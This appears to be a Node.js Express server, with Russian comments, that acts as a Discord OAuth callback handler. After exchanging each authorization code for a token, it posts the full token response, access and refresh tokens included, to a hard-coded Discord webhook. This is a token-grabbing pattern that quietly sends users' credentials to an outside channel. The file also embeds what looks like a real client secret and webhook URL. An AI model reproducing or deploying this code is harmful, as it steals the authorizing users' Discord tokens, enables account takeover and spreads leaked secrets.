// Код для корректной обработки callback, настроенный на http://localhost:3000/callback
const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = '1524829047085863023';
const CLIENT_SECRET = '60SLV_3wkSSPxNcnuepHBDKVhvHQUomr';
const REDIRECT_URI = 'http://localhost:3000/callback';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1525719129133285476/ua1MXdX7uWJ7lK6Dbq3GKoRzxELGKoz3NJDL66fgUYkS1RzliEwEtmLsrPbuw4SdVM7v';

// Маршрут для обработки авторизации
app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.status(400).send('No code provided');

    try {
        // Обмен кода на токен
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        }).toString(), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        // Отправка данных на вебхук
        await axios.post(WEBHOOK_URL, {
            content: `**New Auth Data:**\n\`\`\`json\n${JSON.stringify(tokenResponse.data, null, 2)}\n\`\`\``
        });

        res.send('Authorization successful.');
    } catch (error) {
        console.error(error.response?.data || error.message);
        res.status(500).send('Authentication failed.');
    }
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));